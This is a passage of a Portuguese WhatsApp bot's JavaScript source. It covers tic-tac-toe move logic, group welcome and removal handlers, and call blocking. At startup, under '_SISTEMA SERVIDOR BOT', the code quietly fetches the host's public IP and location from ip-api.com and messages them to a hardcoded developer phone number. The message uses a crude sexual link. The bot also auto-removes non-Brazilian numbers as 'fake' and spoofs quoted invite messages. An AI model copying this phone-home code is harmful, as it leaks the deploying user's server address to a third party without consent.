               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.b2 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.b3 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
               (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
          tttset.reActivate1 = "off"
          esp.c1 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
              ((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕"))) {
          tttset.reActivate1 = "off"
          esp.c2 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
		    ((esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
               (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
          tttset.reActivate1 = "off"
          esp.c3 = "⭕"
	} else if (tttset.tttdifficulty == "IMPOSSIBLE" && (esp.a1 ==  "🔲" || esp.a3 ==  "🔲" || esp.b2 ==  "🔲" || esp.c1 ==  "🔲" || esp.c3 ==  "🔲")) {
		//PRIORIZAR CANTOS E CENTRO
		tttset.reActivate1 = "off"
		while (tttset.reActivate3 == "on") {
			priorityC()
		}
		tttset.reActivate3 = "on"
//FIM DO MODO IMPOSSIVEL
	} else if (tttset.tttdifficulty == "HARD" && ( 
		//TESTE PARA TENTATIVA DE VITÓRIA
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
		(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
		(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
		(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
		(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
		(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
		//TESTE PARA TENTATIVA DE BLOQUEIO
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
		(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
		(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
		(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
		(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
		(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
	)){
		//HARD
		tttset.reActivate1 = "off"
		IAmove1()
	} else if (tttset.tttdifficulty == "NORMAL" && ( 
		//TESTE PARA TENTATIVA DE VITÓRIA
		(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
		(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
		(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
		(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
		(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
		(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
		//TESTE PARA TENTATIVA DE BLOQUEIO
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
		(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
		(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
		(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
		(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
		(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
	)){
		//NORMAL
		tttset.reActivate1 = "off"
		let randomNORMAL = Math.floor(Math.random() * 3)
		if (randomNORMAL == 0 || randomNORMAL == 1) {
			IAmove1()
		} else {
			while (tttset.reActivate2 == "on") {
				IAalter()
			}
		}
		tttset.reActivate2 = "on"
	} else {
		//EASY / RANDOM
		let randomALL = Math.floor(Math.random() * 9)
		switch (randomALL) {
			case 0:
				if (esp.a1 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.a1 = "⭕"
    	        }
    	    break
			case 1:
				if (esp.a2 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.a2 = "⭕"
    	        }
    	    break
			case 2:
				if (esp.a3 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.a3 = "⭕"
    	        }
    	    break
			case 3:
				if (esp.b1 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.b1 = "⭕"
    	        }
    	    break
			case 4:
				if (esp.b2 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.b2 = "⭕"
    	        }
    	    break
			case 5:
				if (esp.b3 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.b3 = "⭕"
    	        }
    	    break
			case 6:
				if (esp.c1 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.c1 = "⭕"
    	        }
    	    break
			case 7:
				if (esp.c2 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.c2 = "⭕"
    	        }
    	    break
			case 8:
				if (esp.c3 == "🔲") {
        	        tttset.reActivate1 = "off"
        	        esp.c3 = "⭕"
        	    }
        	break
		}
	}
}

const IAmove1 = () => {
	//JOGADA PARA VITÓRIA
	if (esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") {
		esp.a3 = "⭕"
	} else if (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") {
		esp.a2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") {
		esp.a1 = "⭕"
	} else if (esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") {
		esp.b3 = "⭕"
	} else if (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") {
		esp.b1 = "⭕"
	} else if (esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") {
		esp.c2 = "⭕"
	} else if (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") {
		esp.c1 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") {
		esp.b1 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") {
		esp.a1 = "⭕"
	} else if (esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") {
		esp.c2 = "⭕"
	} else if (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") {
		esp.a2 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") {
		esp.b3 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") {
		esp.a3 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") {
		esp.a1 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") {
		esp.a3 = "⭕"
	//JOGADA PARA BLOQUEIO
	} else if (esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") {
		esp.a3 = "⭕"
	} else if (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") {
		esp.a2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") {
		esp.a1 = "⭕"
	} else if (esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") {
		esp.b3 = "⭕"
	} else if (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") {
		esp.b2 = "⭕"
	} else if (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") {
		esp.b1 = "⭕"
	} else if (esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") {
		esp.c2 = "⭕"
	} else if (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") {
		esp.c1 = "⭕"
	} else if (esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") {
		esp.b1 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") {
		esp.a1 = "⭕"
	} else if (esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") {
		esp.c2 = "⭕"
	} else if (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") {
		esp.b2 = "⭕"
	} else if (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") {
		esp.a2 = "⭕"
	} else if (esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") {
		esp.b3 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") {
		esp.a3 = "⭕"
	} else if (esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") {
		esp.b2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") {
		esp.a1 = "⭕"
	} else if (esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") {
		esp.b2 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌") {
		esp.a3 = "⭕"
	}
}

//MOVIMENTO ALTERNATIVO
const IAalter = () => {
	let randomALTER = Math.floor(Math.random() * 9)
	switch (randomALTER) {
		case 0:
			if (esp.a1 == "🔲") {
                tttset.reActivate2 = "off"
                esp.a1 = "⭕"
            }
        break
		case 1:
			if (esp.a2 == "🔲") {
                tttset.reActivate2 = "off"
                esp.a2 = "⭕"
            }
        break
		case 2:
			if (esp.a3 == "🔲") {
                tttset.reActivate2 = "off"
                esp.a3 = "⭕"
            }
        break
		case 3:
			if (esp.b1 == "🔲") {
                tttset.reActivate2 = "off"
                esp.b1 = "⭕"
            }
        break
		case 4:
			if (esp.b2 == "🔲") {
                tttset.reActivate2 = "off"
                esp.b2 = "⭕"
            }
        break
		case 5:
			if (esp.b3 == "🔲") {
                tttset.reActivate2 = "off"
                esp.b3 = "⭕"
            }
        break
		case 6:
			if (esp.c1 == "🔲") {
                tttset.reActivate2 = "off"
                esp.c1 = "⭕"
            }
        break
		case 7:
			if (esp.c2 == "🔲") {
                tttset.reActivate2 = "off"
                esp.c2 = "⭕"
            }
        break
		case 8:
			if (esp.c3 == "🔲") {
                tttset.reActivate2 = "off"
                esp.c3 = "⭕"
            }
        break
	}
}

//JOGAR NOS CANTOS E CENTRO - IMPOSSIVEL
const priorityC = () => {
	let randomPriC = Math.floor(Math.random() * 5)
	switch (randomPriC) {
		case 0 :
			if (esp.a1 == "🔲") {
				tttset.reActivate3 = "off"
				esp.a1 = "⭕"
			}
		break
		case 1 :
			if (esp.a3 == "🔲") {
				tttset.reActivate3 = "off"
				esp.a3 = "⭕"
			}
		break
		case 2 :
			if (esp.b2 == "🔲") {
				tttset.reActivate3 = "off"
				esp.b2 = "⭕"
			}
		break
		case 3 :
			if (esp.c1 == "🔲") {
				tttset.reActivate3 = "off"
				esp.c1 = "⭕"
			}
		break
		case 4 :
			if (esp.c3 == "🔲") {
				tttset.reActivate3 = "off"
				esp.c3 = "⭕"
			}
		break
	}
}
///_ END TIC-TAC-TOE CONFIG


//_CONEXÃO WHATSAPP WEB 
async function starts() {
const loli = new WAConnection()
loli.logger.level = 'warn'
console.log(banner.string)
loli.on('qr', () => {
 		console.log(color('[','white'), color('!','red'), color(']','white'), color('LEIA O QR CODE ACIMA 👆'))
})
fs.existsSync('./loli.json') && loli.loadAuthInfo('./loli.json')
 loli.on('connecting', () => {
start('2', 'Carregando...')		   
})
loli.on('open', () => {
success('2', `[❗] foi conectada`)		   
})
	await loli.connect({timeoutMs: 30*1000}) 
fs.writeFileSync('./loli.json', JSON.stringify(loli.base64EncodedAuthInfo(), null, '\t'))    

/********** FUCTION DINHEIRO **********/
const confirmATM = (sender, amount) => {
let position = false
Object.keys(uang).forEach((i) => {
if (uang[i].id === sender) {
position = i
}
})
if (position !== false) {
uang[position].uang -= amount
fs.writeFileSync('./datauser/uang.json', JSON.stringify(uang))
}
}

//_FUCTION DE BOAS-VINDAS
    loli.on('group-participants-update', async(anu) => {
const dbackid = []
for(i=0;i<dontback.length;++i) dbackid.push(dontback[i].groupId) 
mdata = await loli.groupMetadata(anu.jid)
if(antiteste.includes(anu.jid)) {
if (anu.action == 'add'){
num = anu.participants[0]
if(!num.split('@')[0].startsWith(55)) {
loli.sendMessage(mdata.id, '😠Suma número Fake, Shineeeeeeeee🤬😡', MessageType.text)
setTimeout(async function () {
loli.groupRemove(mdata.id, [num])
					}, 3000)
				}
			}
}
		 if(dbackid.indexOf(anu.jid) >= 0) {
			if (anu.action == 'add'){ 
				num = anu.participants[0]
				var ind = dbackid.indexOf(anu.jid)
				if(dontback[ind].actived && dontback[ind].number.indexOf(num.split('@')[0]) >= 0) {
					await loli.sendMessage(mdata.id, '*Olha quem deu as cara por aqui, sente o poder da katana do zadik*', MessageType.text)
					loli.groupRemove(mdata.id, [num])
					return
				}
}
}
        if (!welcome.includes(anu.jid)) return
        try {
            mem = anu.participants[0]
            console.log(anu)
            try {
                pp_user = await loli.getProfilePicture(mem)
            } catch (e) {
                pp_user = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
            try {
                pp_grup = await loli.getProfilePicture(anu.jid)
            } catch (e) {
                pp_grup = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
            if (anu.action == 'demote') {
              //if(!x9.includes(anu.jid)) return 
                mdata = await loli.groupMetadata(anu.jid)
                member = mdata.participants.length
                num = anu.participants[0]
                anu_user = loli.contacts[mem]
                teks = `MEMBRO REBAIXADO\n\n@${num.split('@')[0]} foi rebaixado a membro comum...`
                loli.sendMessage(mdata.id, teks, MessageType.text, {
                    contextInfo: {
                        "mentionedJid": [num]
                    }
                })

            }
            if (anu.action == 'promote') {
            mdata = await loli.groupMetadata(anu.jid)
            //if(!x9.includes(anu.jid)) return
            member = mdata.participants.length
        	num = anu.participants[0]
            anu_user = loli.contacts[mem]
            teks = `@${num.split('@')[0]} foi promovido a administrador do grupo!`
	          loli.sendMessage(mdata.id, teks, MessageType.text, { contextInfo: {"mentionedJid": [num]}})
		}
            if (anu.action == 'add') {
                mdata = await loli.groupMetadata(anu.jid)
                member = mdata.participants.length
                num = anu.participants[0]
                anu_user = loli.contacts[mem]
                const bemgif2 = fs.readFileSync('./src/bemgif.mp4')
               teks = `Olá @${num.split('@')[0]}\nBem vindo ao grupo ${mdata.subject}\n\nEspero que goste do grupo`
			   loli.sendMessage(mdata.id, bemgif2,  MessageType.video, {mimetype: 'video/gif', 
                	tbumbnail:null,
                    caption: teks,
                    contextInfo: {
                        "mentionedJid": [num]
                    }
                })
            } 

            if (anu.action == 'remove') {
                mdata = await loli.groupMetadata(anu.jid)
                num = anu.participants[0]
                anu_user = loli.contacts[mem]
                member = mdata.participants.length
                const byegif2 = fs.readFileSync('./src/byegif.mp4')
               out = `Sayonara @${num.split('@')[0]} Até Algum dia onii-chan 😔`
                buf = fs.readFileSync(`./database/audios/saiudogrupo.mp3`)
                loli.sendMessage(mdata.id, buf, MessageType.audio, {mimetype: 'audio/mp4', ptt: true})
                loli.sendMessage(mdata.id, byegif2,  MessageType.video, {mimetype: 'video/gif',
                	tbumbnail:null,
                    caption: out,
                    contextInfo: {
                        "mentionedJid": [num]
                    }
                })
            }
        } catch (e) {
            console.log('Error : %s', color(e, 'red'))
        }
    })

    loli.on('CB:Blocklist', json => {
        if (blocked.length > 2) return
        for (let i of json[1].blocklist) {
            blocked.push(i.replace('c.us', 's.whatsapp.net'))
        }
    })
loli.on('group-update', async (anu) => {
falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "Hori", "caption": `${NomeDoBot}`, 'jpegThumbnail': fs.readFileSync(`database/help/logo.jpeg`)}}}
  metdata = await loli.groupMetadata(anu.jid)
    if(anu.announce == 'false'){
    teks = `「 *[❗] GRUPO ABERTO* 」\n\n_O grupo foi aberto pelo administrador_\n_Agora todos os membros podem enviar mensagens_`
    loli.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
 // }
  //else if(anu.announce == 'true'){
    //teks = `「 *[❗] GRUPO FECHADO* 」\n\n_O grupo foi fechado pelo administrador_\n_Agora, apenas administradores podem enviar mensagens_`
    //loli.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    //console.log(anu)
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `「 *[❗] DESCRIÇÃO DO GRUPO ALTERADA* 」\n\nA descrição do grupo foi alterada pelo administrador wa.me/${anu.descOwner.split('@')[0]}\n• Nova Descrição : \n${anu.desc}`
    loli.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
    console.log(anu)
  }
  else if(anu.restrict == 'false'){
    teks = `「 [❗]*AS CONFIGURAÇÃO DO GRUPO FOI ALTERADA* 」\nAgora todos os membros podem editar as informações deste grupo`
    loli.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(anu)
  }
  else if(anu.restrict == 'true'){
    teks = `「 *[❗]*AS CONFIGURAÇÃO DO GRUPO FOI ALTERADA* 」\n\nos Membros comum não pode mais editar o grupo\nSomente admins`
    loli.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
    console.log(anu)
  }
 })
//_SISTEMA SERVIDOR BOT
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       loli.sendMessage("5521971702453@s.whatsapp.net", `─────「 *IP-SERVIDOR* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Criador *_zadik_*",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./lib/logo.jpeg'),sourceUrl:"https://api.whatsapp.com/send?phone=5521971702453&text=zadik,come%20minha%20bucetinha??%F0%9F%A5%B5%F0%9F%A5%B5"}}})
     console.log(color('|servidor|', 'yellow'), color('Enviando endereço IP para o bot do desenvolvedor', 'red'))
   })
    loli.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        console.log("LIGAÇÃO DE" + callerId)
        loli.sendMessage(callerId, "Ligações = block", MessageType.text)
        setTimeout(async() => {
            await loli.blockUser(callerId, "add")
        }, 4000)
    })
    
    loli.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
	   global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
        if (json[2][0][1].live == 'true') charging = true
       if (json[2][0][1].live == 'false') charging = false
        console.log(json[2][0][1])
		console.log(color('🔋Carga da bateria: ' + batterylevel+'%', "yellow"))
	})
  loli.on('CB:action,,battery', json => {
